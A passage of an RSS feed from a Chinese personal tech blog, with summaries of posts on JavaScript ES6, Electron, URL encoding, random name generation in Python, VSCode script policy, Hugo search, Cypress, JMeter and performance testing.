      <pubDate>Fri, 17 Sep 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/web/web%E5%BC%80%E5%8F%9115es6-es12-%E7%9A%84%E5%BC%80%E5%8F%91%E6%8A%80%E5%B7%A7/</guid>
      <description>参考原文：ES6-ES12的开发技巧 @Sunshine_Lin 
 ES6 1.let 和 const 在 ES6 出现了新的变量 let 和 const ，与 var 相比：
 var有变量提升，值可变，允许重复声明 let没有变量提升，值可变，不允许重复声明 const没有变量提升，值不可变，但如果是定义对象，则属性可变  // let 无变量提升 t = 2; console.log(t); let t; // Cannot access &amp;#39;t&amp;#39; before initialization console.log(t); let t; // t is not defined t1 = 2; console.log(t1); var t1; // 2 console.log(t1); var t1; // undefined PS：变量提升(声明提升)：函数声明和变量声明总是会被解释器悄悄地被&amp;quot;提升&amp;quot;到方法体的最顶部。
x = 5; // 变量 x 设置为 5 console.log(x)； var x; // 声明 x 实际上，上述代码等于下述代码，在运行时，x 的的声明被提升到最顶部</description>
    </item>
    
    <item>
      <title>随记(36)——Electron应用程序框架</title>
      <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B036electron-%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%A1%86%E6%9E%B6/</link>
      <pubDate>Fri, 17 Sep 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B036electron-%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%A1%86%E6%9E%B6/</guid>
      <description>参考文档 Electron：PC 端多端融合方案  Electron 应用调试指南 
 Electron Electron 是一个基于 Node.js 和 Chromium 的开源框架，常用于构建桌面应用，开发者可以使用 web 技术（HTML，JavaScript 和 CSS）完成整个应用的开发。许多知名桌面应用基于 Electron 实现，如 VSCode，Slack 和 GitHub Desktop 等。
Electron 应用进程分为主进程和渲染进程，其底层实现分别对应于 Node.js 和 Chromium，和 Native 中的概念不一样的是 Electron 中主进程只有一个，而渲染进程（也就是 UI 进程） 可以有多个。主进程在后台运行，每次打开一个界面，会新开一个新的渲染进程。
 渲染进程： 用户看到的 web 界面就是由渲染进程绘制出来的，包括 html、css、js。 主进程：Electron 运行 package.json 中的 main.js 脚本的进程被称为主进程。在主进程中运行的脚本通过创建 web 页面来展示用户界面。一个 Electron 应用程序总是只有一个主进程。  Chromium 架构 浏览器分为单进程和多进程架构。下面先讲讲 Chrome 为代表的浏览器过去和未来。
单进程浏览器 单进程浏览器指的是浏览器的所有功能模块都是运行在同一个进程里的，这些模块包括网络、插件、Javascript 运行环境、渲染引擎和页面等。如此复杂的功能都在一个进程内运行，所以容易导致浏览器的不稳定、不安全、不流畅。
问题1: 不稳定 早期浏览器需要借助插件来实现类似 Web 视频、Web 游戏等各种强大的功能。但插件往往是最容易出现问题的模块。此外因为运行在浏览器进程中，所以一个插件的意外崩溃会导致整个浏览器的崩溃。除了插件之外，渲染引擎模块也是不稳定的。通常一些复杂的 Javascript 代码就有可能导致渲染引擎模块的崩溃。</description>
    </item>
    
    <item>
      <title>BUG(20)——Request 模块 Url 编码问题</title>
      <link>https://ac-lm.github.io/posts/bug/bug20request-%E6%A8%A1%E5%9D%97-url-%E7%BC%96%E7%A0%81%E9%97%AE%E9%A2%98/</link>
      <pubDate>Thu, 16 Sep 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/bug/bug20request-%E6%A8%A1%E5%9D%97-url-%E7%BC%96%E7%A0%81%E9%97%AE%E9%A2%98/</guid>
      <description>BUG 描述 Python 中用户使用 Requests 库发送 Http 请求时，请求的所有参数都会被进行 Url 编码。此时容易出现由于 Url 编码后参数异常的情况，特别是中文字符，最终导致 Http 请求失败。
Resolution 用户可以将参数提前进行编码传递，以避免 Requests 库对参数的编码
payload1 = &amp;#39;{ABC}&amp;#39; # String data = payload1.encode(&amp;#39;utf-8&amp;#39;) # b&amp;#39;{ABC}&amp;#39; 转换后的 UTF-8 编码 response = requests.request(&amp;#34;POST&amp;#34;, url, data=data) 复现 def import_school(): api = &#39;http://192.168.1.240/base/school&#39; school_name = [&#39;第一中学&#39;, &#39;第二中学&#39;, &#39;实验中学&#39;] jurisdiction = [&#39;荔湾区&#39;, &#39;越秀区&#39;, &#39;海珠区&#39;, &#39;天河区&#39;, &#39;白云区&#39;, &#39;黄埔区&#39;, &#39;番禺区&#39;, &#39;花都区&#39;, &#39;南沙区&#39;, &#39;从化区&#39;, &#39;增城区&#39;] county_number = [440103, 440104, 440105, 440106, 440111, 440112, 440113, 440114, 440115, 440117, 440118] print(len(jurisdiction)) print(len(county_number)) did = &amp;quot;440104002&amp;quot; area_id = 3 data = {&amp;quot;name&amp;quot;: &amp;quot;越秀第二中学&amp;quot;, &amp;quot;is_famous&amp;quot;: 2, &amp;quot;school_number&amp;quot;: 440104, &amp;quot;principal&amp;quot;: &amp;quot;&amp;quot;, &amp;quot;telephone&amp;quot;: &amp;quot;&amp;quot;, &amp;quot;address&amp;quot;: &amp;quot;&amp;quot;, &amp;quot;email&amp;quot;: &amp;quot;&amp;quot;, &amp;quot;logo_url&amp;quot;: &amp;quot;&amp;quot;, &amp;quot;icon_url&amp;quot;: &amp;quot;&amp;quot;, &amp;quot;official_website&amp;quot;: &amp;quot;&amp;quot;, &amp;quot;org_web_path&amp;quot;: did, &amp;quot;area_id&amp;quot;: area_id, &amp;quot;user_name&amp;quot;: did, &amp;quot;account&amp;quot;: did, &amp;quot;password&amp;quot;: &amp;quot;7c4a8d09ca3762af61e59520943dc26494f8941b&amp;quot;} response = requests.</description>
    </item>
    
    <item>
      <title>Python(34)——随机生成中文字符名字</title>
      <link>https://ac-lm.github.io/posts/python/python34%E9%9A%8F%E6%9C%BA%E7%94%9F%E6%88%90%E4%B8%AD%E6%96%87%E5%AD%97%E7%AC%A6%E5%90%8D%E5%AD%97/</link>
      <pubDate>Thu, 16 Sep 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/python/python34%E9%9A%8F%E6%9C%BA%E7%94%9F%E6%88%90%E4%B8%AD%E6%96%87%E5%AD%97%E7%AC%A6%E5%90%8D%E5%AD%97/</guid>
      <description>一.如何生成中文字符 1.Unicode 编码 在 Unicode 编码中，汉字的范围是（ 0x4E00，9FBF），因此我们可以从中取值生成中文字符。需要注意的是，Unicode 编码中收录了 2 万多个汉字，其中包含很多生僻的繁体字。
import random def Unicode(): val = random.randint(0x4e00, 0x9fbf) return chr(val) 2.GBK2312 GBK2312 对字符的编码采用的是两个字节相组合，中文字符第一个字节的范围是（ 0xB0-0xF7 ），第二个字节的范围是（ 0xA1- 0xFE），GBK2312 收录了 6 千多常用汉字。
import random def GBK2312(): head = random.randint(0xb0, 0xf7) body = random.randint(0xa1, 0xf9) # 在head区号为55的那一块最后5个汉字是乱码,为了方便缩减下范围 val = f&amp;#39;{head:x}{body:x}&amp;#39; str = bytes.fromhex(val).decode(&amp;#39;gb2312&amp;#39;) return str 3.自行生成字典 def second_name(): # 随机取名字典 second_name_list = [ &amp;#39;秀&amp;#39;, &amp;#39;娟&amp;#39;, &amp;#39;英&amp;#39;, &amp;#39;华&amp;#39;, &amp;#39;慧&amp;#39;, &amp;#39;巧&amp;#39;, &amp;#39;美&amp;#39;, &amp;#39;娜&amp;#39;, &amp;#39;静&amp;#39;, &amp;#39;淑&amp;#39;, &amp;#39;惠&amp;#39;, &amp;#39;珠&amp;#39;, &amp;#39;翠&amp;#39;, &amp;#39;雅&amp;#39;, &amp;#39;芝&amp;#39;, &amp;#39;玉&amp;#39;, &amp;#39;萍&amp;#39;, &amp;#39;红&amp;#39;, &amp;#39;娥&amp;#39;, &amp;#39;玲&amp;#39;, &amp;#39;芬&amp;#39;, &amp;#39;芳&amp;#39;, &amp;#39;燕&amp;#39;, &amp;#39;彩&amp;#39;, &amp;#39;春&amp;#39;, &amp;#39;菊&amp;#39;, &amp;#39;兰&amp;#39;, &amp;#39;凤&amp;#39;, &amp;#39;洁&amp;#39;, &amp;#39;梅&amp;#39;, &amp;#39;琳&amp;#39;, &amp;#39;素&amp;#39;, &amp;#39;云&amp;#39;, &amp;#39;莲&amp;#39;, &amp;#39;真&amp;#39;, &amp;#39;环&amp;#39;, &amp;#39;雪&amp;#39;, &amp;#39;荣&amp;#39;, &amp;#39;爱&amp;#39;, &amp;#39;畅&amp;#39;, &amp;#39;霞&amp;#39;, &amp;#39;香&amp;#39;, &amp;#39;月&amp;#39;, &amp;#39;莺&amp;#39;, &amp;#39;媛&amp;#39;, &amp;#39;艳&amp;#39;, &amp;#39;瑞&amp;#39;, &amp;#39;凡&amp;#39;, &amp;#39;佳&amp;#39;, &amp;#39;嘉&amp;#39;, &amp;#39;琼&amp;#39;, &amp;#39;勤&amp;#39;, &amp;#39;珍&amp;#39;, &amp;#39;贞&amp;#39;, &amp;#39;莉&amp;#39;, &amp;#39;桂&amp;#39;, &amp;#39;娣&amp;#39;, &amp;#39;叶&amp;#39;, &amp;#39;璧&amp;#39;, &amp;#39;璐&amp;#39;, &amp;#39;娅&amp;#39;, &amp;#39;琦&amp;#39;, &amp;#39;晶&amp;#39;, &amp;#39;妍&amp;#39;, &amp;#39;茜&amp;#39;, &amp;#39;秋&amp;#39;, &amp;#39;珊&amp;#39;, &amp;#39;莎&amp;#39;, &amp;#39;锦&amp;#39;, &amp;#39;黛&amp;#39;, &amp;#39;青&amp;#39;, &amp;#39;倩&amp;#39;, &amp;#39;婷&amp;#39;, &amp;#39;姣&amp;#39;, &amp;#39;婉&amp;#39;, &amp;#39;娴&amp;#39;, &amp;#39;瑾&amp;#39;, &amp;#39;颖&amp;#39;, &amp;#39;露&amp;#39;, &amp;#39;瑶&amp;#39;, &amp;#39;怡&amp;#39;, &amp;#39;婵&amp;#39;, &amp;#39;雁&amp;#39;, &amp;#39;蓓&amp;#39;, &amp;#39;纨&amp;#39;, &amp;#39;仪&amp;#39;, &amp;#39;荷&amp;#39;, &amp;#39;丹&amp;#39;, &amp;#39;蓉&amp;#39;, &amp;#39;眉&amp;#39;, &amp;#39;君&amp;#39;, &amp;#39;琴&amp;#39;, &amp;#39;蕊&amp;#39;, &amp;#39;薇&amp;#39;, &amp;#39;菁&amp;#39;, &amp;#39;梦&amp;#39;, &amp;#39;岚&amp;#39;, &amp;#39;苑&amp;#39;, &amp;#39;婕&amp;#39;, &amp;#39;馨&amp;#39;, &amp;#39;瑗&amp;#39;, &amp;#39;琰&amp;#39;, &amp;#39;韵&amp;#39;, &amp;#39;融&amp;#39;, &amp;#39;园&amp;#39;, &amp;#39;艺&amp;#39;, &amp;#39;咏&amp;#39;, &amp;#39;卿&amp;#39;, &amp;#39;聪&amp;#39;, &amp;#39;澜&amp;#39;, &amp;#39;纯&amp;#39;, &amp;#39;毓&amp;#39;, &amp;#39;悦&amp;#39;, &amp;#39;昭&amp;#39;, &amp;#39;冰&amp;#39;, &amp;#39;爽&amp;#39;, &amp;#39;琬&amp;#39;, &amp;#39;茗&amp;#39;, &amp;#39;羽&amp;#39;, &amp;#39;希&amp;#39;, &amp;#39;宁&amp;#39;, &amp;#39;欣&amp;#39;, &amp;#39;飘&amp;#39;, &amp;#39;育&amp;#39;, &amp;#39;滢&amp;#39;, &amp;#39;馥&amp;#39;, &amp;#39;筠&amp;#39;, &amp;#39;柔&amp;#39;, &amp;#39;竹&amp;#39;, &amp;#39;霭&amp;#39;, &amp;#39;凝&amp;#39;, &amp;#39;晓&amp;#39;, &amp;#39;欢&amp;#39;, &amp;#39;霄&amp;#39;, &amp;#39;枫&amp;#39;, &amp;#39;芸&amp;#39;, &amp;#39;菲&amp;#39;, &amp;#39;寒&amp;#39;, &amp;#39;伊&amp;#39;, &amp;#39;亚&amp;#39;, &amp;#39;宜&amp;#39;, &amp;#39;可&amp;#39;, &amp;#39;姬&amp;#39;, &amp;#39;舒&amp;#39;, &amp;#39;影&amp;#39;, &amp;#39;荔&amp;#39;, &amp;#39;枝&amp;#39;, &amp;#39;思&amp;#39;, &amp;#39;丽&amp;#39;, &amp;#39;伟&amp;#39;, &amp;#39;刚&amp;#39;, &amp;#39;勇&amp;#39;, &amp;#39;毅&amp;#39;, &amp;#39;俊&amp;#39;, &amp;#39;峰&amp;#39;, &amp;#39;强&amp;#39;, &amp;#39;军&amp;#39;, &amp;#39;平&amp;#39;, &amp;#39;保&amp;#39;, &amp;#39;东&amp;#39;, &amp;#39;文&amp;#39;, &amp;#39;辉&amp;#39;, &amp;#39;力&amp;#39;, &amp;#39;明&amp;#39;, &amp;#39;永&amp;#39;, &amp;#39;健&amp;#39;, &amp;#39;世&amp;#39;, &amp;#39;广&amp;#39;, &amp;#39;志&amp;#39;, &amp;#39;义&amp;#39;, &amp;#39;兴&amp;#39;, &amp;#39;良&amp;#39;, &amp;#39;海&amp;#39;, &amp;#39;山&amp;#39;, &amp;#39;仁&amp;#39;, &amp;#39;波&amp;#39;, &amp;#39;宁&amp;#39;, &amp;#39;贵&amp;#39;, &amp;#39;福&amp;#39;, &amp;#39;生&amp;#39;, &amp;#39;龙&amp;#39;, &amp;#39;元&amp;#39;, &amp;#39;全&amp;#39;, &amp;#39;国&amp;#39;, &amp;#39;胜&amp;#39;, &amp;#39;学&amp;#39;, &amp;#39;祥&amp;#39;, &amp;#39;才&amp;#39;, &amp;#39;发&amp;#39;, &amp;#39;武&amp;#39;, &amp;#39;新&amp;#39;, &amp;#39;利&amp;#39;, &amp;#39;清&amp;#39;, &amp;#39;飞&amp;#39;, &amp;#39;彬&amp;#39;, &amp;#39;富&amp;#39;, &amp;#39;顺&amp;#39;, &amp;#39;信&amp;#39;, &amp;#39;子&amp;#39;, &amp;#39;杰&amp;#39;, &amp;#39;涛&amp;#39;, &amp;#39;昌&amp;#39;, &amp;#39;成&amp;#39;, &amp;#39;康&amp;#39;, &amp;#39;星&amp;#39;, &amp;#39;光&amp;#39;, &amp;#39;天&amp;#39;, &amp;#39;达&amp;#39;, &amp;#39;安&amp;#39;, &amp;#39;岩&amp;#39;, &amp;#39;中&amp;#39;, &amp;#39;茂&amp;#39;, &amp;#39;进&amp;#39;, &amp;#39;林&amp;#39;, &amp;#39;有&amp;#39;, &amp;#39;坚&amp;#39;, &amp;#39;和&amp;#39;, &amp;#39;彪&amp;#39;, &amp;#39;博&amp;#39;, &amp;#39;诚&amp;#39;, &amp;#39;先&amp;#39;, &amp;#39;敬&amp;#39;, &amp;#39;震&amp;#39;, &amp;#39;振&amp;#39;, &amp;#39;壮&amp;#39;, &amp;#39;会&amp;#39;, &amp;#39;思&amp;#39;, &amp;#39;群&amp;#39;, &amp;#39;豪&amp;#39;, &amp;#39;心&amp;#39;, &amp;#39;邦&amp;#39;, &amp;#39;承&amp;#39;, &amp;#39;乐&amp;#39;, &amp;#39;绍&amp;#39;, &amp;#39;功&amp;#39;, &amp;#39;松&amp;#39;, &amp;#39;善&amp;#39;, &amp;#39;厚&amp;#39;, &amp;#39;庆&amp;#39;, &amp;#39;磊&amp;#39;, &amp;#39;民&amp;#39;, &amp;#39;友&amp;#39;, &amp;#39;裕&amp;#39;, &amp;#39;河&amp;#39;, &amp;#39;哲&amp;#39;, &amp;#39;江&amp;#39;, &amp;#39;超&amp;#39;, &amp;#39;浩&amp;#39;, &amp;#39;亮&amp;#39;, &amp;#39;政&amp;#39;, &amp;#39;谦&amp;#39;, &amp;#39;亨&amp;#39;, &amp;#39;奇&amp;#39;, &amp;#39;固&amp;#39;, &amp;#39;之&amp;#39;, &amp;#39;轮&amp;#39;, &amp;#39;翰&amp;#39;, &amp;#39;朗&amp;#39;, &amp;#39;伯&amp;#39;, &amp;#39;宏&amp;#39;, &amp;#39;言&amp;#39;, &amp;#39;若&amp;#39;, &amp;#39;鸣&amp;#39;, &amp;#39;朋&amp;#39;, &amp;#39;斌&amp;#39;, &amp;#39;梁&amp;#39;, &amp;#39;栋&amp;#39;, &amp;#39;维&amp;#39;, &amp;#39;启&amp;#39;, &amp;#39;克&amp;#39;, &amp;#39;伦&amp;#39;, &amp;#39;翔&amp;#39;, &amp;#39;旭&amp;#39;, &amp;#39;鹏&amp;#39;, &amp;#39;泽&amp;#39;, &amp;#39;晨&amp;#39;, &amp;#39;辰&amp;#39;, &amp;#39;士&amp;#39;, &amp;#39;以&amp;#39;, &amp;#39;建&amp;#39;, &amp;#39;家&amp;#39;, &amp;#39;致&amp;#39;, &amp;#39;树&amp;#39;, &amp;#39;炎&amp;#39;, &amp;#39;德&amp;#39;, &amp;#39;行&amp;#39;, &amp;#39;时&amp;#39;, &amp;#39;泰&amp;#39;, &amp;#39;盛&amp;#39;, &amp;#39;雄&amp;#39;, &amp;#39;琛&amp;#39;, &amp;#39;钧&amp;#39;, &amp;#39;冠&amp;#39;, &amp;#39;策&amp;#39;, &amp;#39;腾&amp;#39;, &amp;#39;楠&amp;#39;, &amp;#39;榕&amp;#39;, &amp;#39;风&amp;#39;, &amp;#39;航&amp;#39;, &amp;#39;弘&amp;#39;, ] number = random.</description>
    </item>
    
    <item>
      <title>VSCode(3)——系统禁止运行脚本</title>
      <link>https://ac-lm.github.io/posts/ide/vscode3%E7%B3%BB%E7%BB%9F%E7%A6%81%E6%AD%A2%E8%BF%90%E8%A1%8C%E8%84%9A%E6%9C%AC/</link>
      <pubDate>Thu, 16 Sep 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/ide/vscode3%E7%B3%BB%E7%BB%9F%E7%A6%81%E6%AD%A2%E8%BF%90%E8%A1%8C%E8%84%9A%E6%9C%AC/</guid>
      <description>错误描述 node_modules/.bin/babel : 无法加载文件 D:\node\node_project\es6\node_modules\.bin\babel.ps1，因为在此系统上禁止运行脚本。有关详细信息，请参阅 https:/go.microsoft.co m/fwlink/?LinkID=135170 中的 about_Execution_Policies
配置解决  以管理员身份运行 VSCode 执行：get-ExecutionPolicy，此时显示 Restricted，表示状态是禁止的 执行：set-ExecutionPolicy RemoteSigned 再执行 get-ExecutionPolicy，显示 RemoteSigned，表示状态启用  </description>
    </item>
    
    <item>
      <title>Web开发(14)——JavaScript 的 Url 编解码</title>
      <link>https://ac-lm.github.io/posts/web/web%E5%BC%80%E5%8F%9114javascript-%E7%9A%84-url-%E7%BC%96%E8%A7%A3%E7%A0%81/</link>
      <pubDate>Thu, 16 Sep 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/web/web%E5%BC%80%E5%8F%9114javascript-%E7%9A%84-url-%E7%BC%96%E8%A7%A3%E7%A0%81/</guid>
      <description>escape() escape() 不能直接用于URL编码，它的作用是返回一个字符的 Unicode 编码值。比如&amp;quot;春节&amp;quot;的返回结果是%u6625%u8282，escape() 仅不对+进行编码，其主要用于汉字编码。
console.log(escape(&amp;#34;春节+国庆&amp;#34;)) // %u6625%u8282+%u56FD%u5E86 console.log(escape(&amp;#34;春节=+=国庆&amp;#34;)) // %u6625%u8282%3D+%3D%u56FD%u5E86 console.log(unescape(&amp;#39;%u6625%u8282%3D+%3D%u56FD%u5E86&amp;#39;)) // 春节=+=国庆 encodeURI() encodeURI() 是用来对 URL 编码的函数。函数会编码整个 URL 地址，但对特殊含义的符号 ; / ? : @ &amp;amp; = + $ , # 不进行编码。
console.log(encodeURI(&amp;#39;http://baidu.com?hello=您好&amp;amp;word=文档&amp;#39;)) // http://baidu.com?hello=%E6%82%A8%E5%A5%BD&amp;amp;word=%E6%96%87%E6%A1%A3 console.log(decodeURI(&amp;#39;http://baidu.com?hello=%E6%82%A8%E5%A5%BD&amp;amp;word=%E6%96%87%E6%A1%A3&amp;#39;)) // http://baidu.com?hello=您好&amp;amp;word=文档 encodeURIComponent() encodeURIComponent() 能编码如; / ? : @ &amp;amp; = + $ , #这些特殊字符
console.log(encodeURIComponent(&amp;#39;http://baidu.com?hello=您好&amp;amp;word=文档&amp;#39;)) // http%3A%2F%2Fbaidu.com%3Fhello%3D%E6%82%A8%E5%A5%BD%26word%3D%E6%96%87%E6%A1%A3 console.log(decodeURIComponent(&amp;#39;http%3A%2F%2Fbaidu.com%3Fhello%3D%E6%82%A8%E5%A5%BD%26word%3D%E6%96%87%E6%A1%A3&amp;#39;)) // http://baidu.com?hello=您好&amp;amp;word=文档 </description>
    </item>
    
    <item>
      <title>随记(35)——如何给hugo博客添加搜索功能</title>
      <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B035%E5%A6%82%E4%BD%95%E7%BB%99-hugo-%E5%8D%9A%E5%AE%A2%E6%B7%BB%E5%8A%A0%E6%90%9C%E7%B4%A2%E5%8A%9F%E8%83%BD/</link>
      <pubDate>Thu, 16 Sep 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B035%E5%A6%82%E4%BD%95%E7%BB%99-hugo-%E5%8D%9A%E5%AE%A2%E6%B7%BB%E5%8A%A0%E6%90%9C%E7%B4%A2%E5%8A%9F%E8%83%BD/</guid>
      <description>参考原文：给Hugo站点添加搜索功能 - Go语言中文网
 实现思路  利用 hugo 生成的 index.xml 文件进行内容搜索。路径 public &amp;gt; index.xml。文件包含博客所有文章的标题，链接和概要。 JavaScript 实现如下  if(window.location.pathname === &amp;#39;/404.html&amp;#39;){ query = window.location.search.substr(1) if(query){ searchKey = query.replace(&amp;#39;query=&amp;#39;, &amp;#39;&amp;#39;) // $(&amp;#39;#404&amp;#39;).text(decodeURI(searchKey)); 	$(&amp;#39;#404&amp;#39;).text(&amp;#39;搜索结果&amp;#39;) $.get(&amp;#39;/index.xml&amp;#39;, function(data){ items = data.getElementsByTagName(&amp;#34;item&amp;#34;); var i = 0; var node = &amp;#39;&amp;#39; while ( i &amp;lt; items.length) { txt = items[i].getElementsByTagName(&amp;#34;title&amp;#34;)[0].innerHTML + items[i].getElementsByTagName(&amp;#34;description&amp;#34;)[0].innerHTML; if((txt.indexOf(searchKey)) &amp;gt; -1){ var title = items[i].getElementsByTagName(&amp;#34;title&amp;#34;)[0].innerHTML; console.log(items[i].getElementsByTagName(&amp;#34;description&amp;#34;)[0].innerHTML); var link = items[i].getElementsByTagName(&amp;#34;link&amp;#34;)[0].innerHTML; node = node + &amp;#39;&amp;lt;p&amp;gt;&amp;lt;a href=&amp;#34;&amp;#39; + link + &amp;#39;&amp;#34;&amp;gt;&amp;#39; + title + &amp;#39;&amp;lt;/a&amp;gt;&amp;lt;/p&amp;gt;&amp;#39; }; i++; } div = document.</description>
    </item>
    
    <item>
      <title>Cypress(1)——安装</title>
      <link>https://ac-lm.github.io/posts/cypress/cypress1%E5%AE%89%E8%A3%85/</link>
      <pubDate>Fri, 10 Sep 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/cypress/cypress1%E5%AE%89%E8%A3%85/</guid>
      <description>Cypress Cypress 是使用现代 JavaScript 框架构建的前端测试工具。
环境 node.js，安装 &amp;gt; Node.js (nodejs.org)
安装 下载 Cypress，执行下列命令安装
cd /your/project/path npm install cypress --save-dev # 将 cypress 工程依赖安装在工程目录下 ./node_modules/.bin/cypress.cmd version # Windows 下执行该命令 ./node_modules/.bin/cypress version # Linux 执行该命令 ./node_modules/.bin/cypress.cmd install # 安装 cypress 二进程应用程序，程序将会被安装在 C:\Users\13126\AppData\Local\Cypress\Cache\8.3.1\Cypress 以供全局使用 ./node_modules/.bin/cypress.cmd open npx cypress open # 启动项目 </description>
    </item>
    
    <item>
      <title>Net(10)——JMeter录制测试脚本</title>
      <link>https://ac-lm.github.io/posts/%E7%BD%91%E7%BB%9C%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/net10jmeter-%E5%BD%95%E5%88%B6%E6%B5%8B%E8%AF%95%E8%84%9A%E6%9C%AC/</link>
      <pubDate>Fri, 10 Sep 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/%E7%BD%91%E7%BB%9C%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/net10jmeter-%E5%BD%95%E5%88%B6%E6%B5%8B%E8%AF%95%E8%84%9A%E6%9C%AC/</guid>
      <description>参考原文：Apache JMeter - Apache JMeter HTTP(S) Test Script Recorder
 1.JMeter设置代理服务器   在工具栏中选择 Templates…
  
  搜索并选择 Recording 脚本录制模板
  
  此时出现如图完整的 Test Plan
  
  在 HTTP(S) Test Script Recorder 中，点击启动即可，开启 Jmeter 服务器。
  
  2.证书 JMeter 启动代理服务器后会在 JMETER_HOME/bin 中生成一个证书 ApacheJMeterTemporaryRootCA.crt ，用户需要安装此证书，才可使用代理服务器。
打开任意浏览器，在设置中搜索证书，前往证书设置界面，导入证书至 受信任的根证书颁布机构。
3.浏览器配置 打开任意浏览器，在设置中搜索代理，前往代理设置界面，配置如下内容，启动代理。
 地址：localhost Port：8888.  
4.查看结果 尝试在浏览器中点击多个链接，关闭浏览器后，您可以在 Thread Group -&amp;gt; Recording Controller 中看到 JMeter 捕抓的HTTP请求内容</description>
    </item>
    
    <item>
      <title>随记(34)——性能测试</title>
      <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B034%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/</link>
      <pubDate>Fri, 10 Sep 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B034%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/</guid>
      <description>按我个人的理解：性能测试的最终目的是：测试产品的服务能否在高负载情况下保持稳定
什么是产品的服务 这里的产品指的是 B/S（浏览器/服务器）和 C/S（客户机/服务器） 这类架构的服务器。我们的性能测试主要针对的也就是这类服务器提供的各种服务，比如搜索，提交数据，下载资源等，通常这类服务在网络上体现为一个个接口，而我们的性能测试，大部分也就是对这些接口进行测试。比如百度的搜索接口
http://www.baidu.com/s?wd=关键字&amp;amp;cl=类型&amp;amp;pn=页码&amp;amp;ie=gb2312&amp;amp;rn=显示条数&amp;amp;tn=原站点
高负载是指什么 上述我们知道产品大部分是指服务器，而服务器的高负载通常也就几个：内存，CPU，硬盘读写，网络带宽，这类计算机系统指标。要触发这些指标的高负载，并发是不错的操作之一
如何判断系统的稳定 如何判断系统的稳定，也就是性能测试的断言。最简单的方法是在性能测试时，自己使用产品观看效果，观察产品能不能正常使用，使用的体验好不好，这些都是最直观的判断依据。或者你可以登录服务器后台，查看服务器的资源占用率，通过这来判断系统是否正常。而对于Web服务，除了上述的断言方法，还可以使用 [随记(11)——Web性能测试的指标](LM (ac-lm.github.io)
如何测试  定位服务：确定需要测试的内容，定位到最小的单位。比如需要测试系统最多支持多少人同时登录，那我们只需构造线程并发测试系统的登录接口便可以，而不需要考虑打开网页等内容。 构造高负载情况：通过各种方式在服务器端构造一个高负载的环境 断言：使用各种方法来判断系统是否处于稳定状态 编写报告：根据断言编写报告  </description>
    </item>
    
    <item>
      <title>Net(9)——JMeter构建Web测试计划</title>
      <link>https://ac-lm.github.io/posts/%E7%BD%91%E7%BB%9C%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/net9jmeter-%E6%9E%84%E5%BB%BA-web-%E6%B5%8B%E8%AF%95%E8%AE%A1%E5%88%92/</link>
      <pubDate>Thu, 09 Sep 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/%E7%BD%91%E7%BB%9C%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/net9jmeter-%E6%9E%84%E5%BB%BA-web-%E6%B5%8B%E8%AF%95%E8%AE%A1%E5%88%92/</guid>
      <description>参考原文：Apache JMeter - User&amp;rsquo;s Manual: Building a Web Test Plan
 ‎在下文中，将介绍如何创建一个基本‎‎的测试计划‎‎来测试 Web 网站。您将创建五个用户，将请求发送到 JMeter 网站上的两个页面。此外，您还会告诉用户运行他们的测试两次。因此，请求总数为 （5 个用户） x （2 个请求） x （重复 2 次） = 20 个 HTTP 请求。
1.添加用户 要执行测试计划，您要做的第一步就是添加‎‎线程组‎‎元素。线程组会告诉 JMeter 您要模拟的用户数量、用户发送请求的频率以及他们应发送的请求数量。‎
首先选择测试计划，然后单击右键获取添加菜单，然后选择添加—&amp;gt;线程组。‎
然后为我们的线程组提供更具描述性的名称。在名称字段中，输入 JMeter 用户。‎接下来，将用户数（称为线程）增加到 5。‎‎在下一个字段中，延时保留默认值 1 秒，此属性告诉 JMeter 在启动每个用户之间延迟多长时间。例如，如果您输入了 5 秒的 Ramp-Up ，JMeter 将在 5 秒结束时完成启动所有用户，因此，如果我们有 5 个用户和 5 秒的 Ramp-Up ，则启动用户之间的延迟将是 1 秒（5 个用户 / 5 秒 = 每秒 1 个用户）。如果将值设置为 0，则 JMeter 将立即启动所有用户。‎</description>
    </item>
    
    <item>
      <title>Django(13)——Django 部署</title>
      <link>https://ac-lm.github.io/posts/django/django13django-%E9%83%A8%E7%BD%B2/</link>
      <pubDate>Fri, 27 Aug 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/django/django13django-%E9%83%A8%E7%BD%B2/</guid>
